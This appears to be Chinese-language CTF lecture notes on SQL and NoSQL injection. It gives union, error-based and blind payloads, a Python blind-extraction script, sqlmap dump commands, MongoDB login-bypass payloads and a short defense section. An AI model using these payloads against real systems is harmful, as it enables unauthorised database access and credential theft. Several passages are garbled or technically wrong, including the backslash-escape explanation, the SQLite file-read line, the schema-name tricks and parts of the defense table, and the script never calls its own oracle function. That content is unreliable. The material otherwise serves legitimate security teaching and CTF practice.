## 1 · SQL 注入

### 1.1 一分鐘原理

```mermaid
flowchart LR
    A["頁面輸入<br/>?id=1"] --> B["後端拼字串<br/>\"SELECT * FROM u WHERE id=\"+id"]
    B --> C{"輸入是否只當「資料」?"}
    C -->|"否（成為語法）"| D["注入成立"]
    D --> E["聯合查詢/報錯/盲注<br/>讀取資料庫全部內容"]
```

一句話：**程式碼與資料的界線消失**。判斷注入點的第一件事，是找出「我的哪個輸入會出現在 SQL 語句裡」。

### 1.2 判斷與注入位置分類

| 位置 | 檢測方式 | 備註 |
|---|---|---|
| GET/POST 參數 | `id=1'`、`id=1 and 1=2` 看回應差異 | 最常見 |
| HTTP 標頭 | User-Agent、Referer、X-Forwarded-For（盲注常藏身處）、Cookie | 常被忽略 |
| JSON Body | 同上，注意引號與編碼 | API 型站點 |
| 資料隱藏參數 | `order=`、`sort=`、`filter=`（ORDER BY 注入） | 見 §1.6 |

### 1.3 聯合查詢注入（能回顯時最快）

> 環境假設：`?id=1`，id 為數字型輸入；頁面會顯示查詢的一部分欄位。

```text
① 判斷欄位數      ?id=1 order by 1..2..3..4   （報錯即減）
② 判斷回顯位      ?id=-1 union select 1,2,3   （頁面上出現數字 = 可回顯位）
③ 拋出資料（MySQL）：
   版本      ?id=-1 union select 1,version(),3
   資料庫    ?id=-1 union select 1,database(),3
   資料表    ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
   欄位名    ... from information_schema.columns where table_name=<表名>
   內容     ... from <flags 表> limit 0,1
```

**注意**：
- `union select` 前面的 `id=-1` 是為了讓原查詢落空，不干擾回顯。
- 点号 `'. 過引號包裹的情境：

```php
// 常見後端（黑名單濾 `'`）:
if (strstr($_GET["id"], "'")) die("WAF");
$sql = "SELECT id,title FROM post WHERE title like '%" . $_GET['id'] . "%'";
```

上下文是「字串內」→ 輸入 `\` 反斜線可有效封口 MySQL 的繼續閱讀端（special escape），常與 `'` 雙向互補成主力。實戰常試：

```text
?id=admin%5C                       → \ 吃掉後端的 '')
後面構成           ... = ... like '%admin\ and xxx%'  → 語法錯誤
?id=admin\ and 1=2  -- | ||/%00
```

### 1.4 報錯注入（沒有回顯但頁面顯示錯誤訊息）

| 函式 | payload | 誤差跳出界 |
|---|---|---|
| `extractvalue()` | `?id=-1 and extractvalue(1, concat(0x7e,(select database()),0x7e))` | 轉換到 XPath 錯誤訊息，可顯示 concat 內容 |
| `updatexml()` | `?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)` | 同上 |
| 括號報錯 | `... and (select 1 from (select count(*),group_concat(database(),@@version) from users;a) x)` | duplicate key |

**限制**：32 字元輸出 → 用 `substr(..,1,10)` / `mid(... , 1, 32)` 分段提取。

### 1.5 布爾盲注與時間盲注（頁面不回顯內容時）

```text
布爾：?id=1' and length(database())>0 -- 判斷「輸出 0/1」
     ?id=1' and ascii(substr((select database()),1,1))>109 --
時間：?id=1' and if(ascii(substr((select database()),1,1))>109,sleep(4),0) --
```

**實作腳本（bisection 提取，20 行模板可直接用）**：

```python
import requests, string, sys

URL = 'http://target:8080/item?id='
PAY = "1' AND ascii(substr(({query}),{i},1))>{n} -- -"
CHARS = string.ascii_lowercase + string.digits + '_{}-~@.=-'
QUERY = "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1"

def oracle(ch,i):
    payload = PAY.format(query=QUERY, i=i, n=ord(ch))
    r = requests.get(URL+ requests.utils.quote(payload) , timeout=8)
    return len(r.text) > 1000     # 覆寫：用實際成功/失敗的內容差異

res = ''
i = 1
while i <= 60:
    chs = CHARS
    if not chs: break
    while len(chs)>1:
        mid = ord(chs[len(chs)//2])
        r = requests.get(URL + requests.utils.quote(f"1' AND ascii(substr(({QUERY}),{i},1))>{mid} -- -"))
        # 失敗判定請按題意修改：例如 r.text 包含 "no such row"
        if not ("welcome" in r.text):      # 都走失敗
            chs = [c for c in chs if ord(c)<=mid]
        else:
            chs = [c for c in chs if ord(c)>mid]
    res += chs[0]
    print(res, end='\r', flush=True)
    i += 1
print('\n' + res)
```

> 說明：`oracle()` 是「注入結果轉化為 0/1 判定」的關鍵。先花 1 分鐘找：**回應長度差**、`Content-Length`、狀態碼、是否缺少某部分元素。
>
> 換用 `sleep + 時間信號`時把 oracle 換成 `r.elapsed.total_seconds() > 3`。**每次輪詢之間加 0.5 秒可避免被限流**。

### 1.6 ORDER BY / LIMIT 注入

```text
?orderby=if(1=1,id,pass)      → 若排序不同為証據
?orderby=updatexml(0,concat(0x7e,(select database())),1)   → 錯誤顯示
?limit=1,2 union select <…>   → 在 `LIMIT $per` 直接拼字串議題式拒絕
```

> limit 後面只有一個空位，可有空格字元捲退 `limit 1,2 union select…` 是 **SQLSyntaxError**；通常用 `limit 1 procedure analyse`（MySQL <8.0）。

### 1.7 報錯堆叠查詢（Stacked Queries）

```text
PDO / mysqli 預設多查詢沒開 → 報錯。
在某些 DB (MSSQL、PostgreSQL with `pg_query`) 可直接:
?id=1;SELECT pg_sleep(5)--
```

> 多語言 binding driver（如 PHP `preg_replace(';\s|\s;,'')`）幾乎不會傻到允許堆叠。但 MSSQL/Postgres 老環境常見。

### 1.8 資料庫方言速查表

| 檢測 payload | MySQL | PostgreSQL | SQLite | MSSQL |
|---|---|---|---|---|
| `union select` | 通用 | 通用 | 通用 | 通用 |
| `version()` | `select version()` | 同 | `select sqlite_version()` | `@@version` |
| `sleep()` | `sleep(4)`／`benchmark(1e7,sha1('a'))` | `pg_sleep(4)` | 無（可用 blob RLIKE 盲注） | `waitfor delay '0:0:4'` |
| 拿 tables | `information_schema.tables` | 同 | `sqlite_master` | `sys.tables` |
| 引號 | ` ' `，hex `0x4142` | 同 | 同 | 同 |

**SQLite 的彩色手法（CTF 常見）**：
```text
集資料      union select 1,sql from sqlite_master --
讀檔案（gIt 版） read into ` /etc/passwd` — 不可用（SQLite 無 file func；Jar 常為 `load_extension`）
```

### 1.9 SQL 注入的欄位/表名黑名單處理

```text
表名  黑名單高頻: flag, flag-table, user, admin, information
逃逸  • 上下文特殊: 'information_schema' 經 HEX `0x696e666f…` 直接以字串比較
     • 大寫 `INFORMATIO_schema`（MySQL 對 schema 大小寫不敏感）
     • 注入空格: `information\_schema`（MySQL 的 `\` 允許語意解讀為 internal）
```

### 1.10 sqlmap 用法（別當主力，用作最後一步）

```bash
sqlmap -u 'http://target/item?id=1' --batch --banner
sqlmap -u 'http://target/login' --data 'u=admin&p=pass' -p p --batch
sqlmap -u 'http://target/item?id=1' --dbs --batch
sqlmap -u 'http://target/item?id=1' -D ctf --tables --batch
sqlmap -u 'http://target/item?id=1' -D ctf -T flags --dump --batch
# tamper 是「被 WAF 擋了」之後才考慮的部分
sqlmap -u '...' --tamper=space2comment,randomcase --batch
```

**工作量分配建議**：手工判斷注入點（10 分鐘內）→ **發現有希望之後**用 sqlmap dump（節省打字）。反過來（先上 sqlmap 盲試）99% 會浪費 20 分鐘。

## 2 · NoSQL 注入（20% 題型，越來越常見）

### 2.1 條件（ Mongod 查詢如何錯位）

```JavaScript
db.users.find({ user: req.body.user, pass: login(req.body.pass) })
```

若後端直接把 JSON body 傳入（`req.body` 是物件而**不是**字串），攻擊者可送：

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
```

從而 hit 第一個（也只剩一個）帳戶。

### 2.2 標準 payload 清單

```text
登入繞過（知道了用戶名）:
  {"user":"admin","pass":{"$ne":"wrong"}}
  {"user":"admin","pass":{"$gt":""}}
  {"user":{"$regex":"^adm"},"pass":{"$ne":""}}

逐字元提取密碼（regex 盲注）:
  {"user":"admin","pass":{"$regex":"^a"}}
  {"user":"admin","pass":{"$regex":"^fl"}}
```

NoSQL 盲注也有一個「快版」——用 `$where`/`$function` 寫 JS 有 MVC 壓制、payload 過大。
常見 `nosql_injection` 提示：**後端拿 `JSON.parse` 而不驗證欄位形態**。

### 2.3 NoSQL 的防禦

- incoming `req.body` 的 `user`/`pass` 一律 `String(req.body.user || '')` 转字串（sanitization）。
- 或用 Mongoose：`model.findOne({ user: { '$eq': String(user) } })`。
- 對 `$regex` 進行字符透（限定最多 12 字元）。

## 3 · SQL 注入防禦（檢視表）

| 問題 | 錯誤做法 | 正確做法 |
|---|---|---|
| 字串拼接 | `$sql = "… " . $inp . "…";` | PDO 預處理語句 |
| escape | `mysql_real_escape_string()`（已淘汰） | `str_replace('%', '\%', $inp)` (限定LIKE) + prepare |
| 判斷數字 | `is_numeric()` 白名單 | `(int)$idx``
| ORDER BY 佐證 | `concat('a','b')` 讓其顛簸 | 白名單：`['id','time']` 中 in_array，
| LIKE 佐證 | `%` 萬用允許 | `preg_replace('/[\%\_]/u', '', $inp)` |
| 加「安全標頭」 | 「我已有 WAF」 | 識字模糊=失落後；防禦與隔離分層 |

**PDO 標準用法**：

```php
$stmt = $pdo->prepare('SELECT id,title FROM post WHERE id = ?');
$stmt->execute([ (int)$_GET['id'] ]);
$rows = $stmt->fetchAll();
```

> W8 講把這裡的「修補」與「審計」合併成 demo；本講只需知道「改對了沒有？」
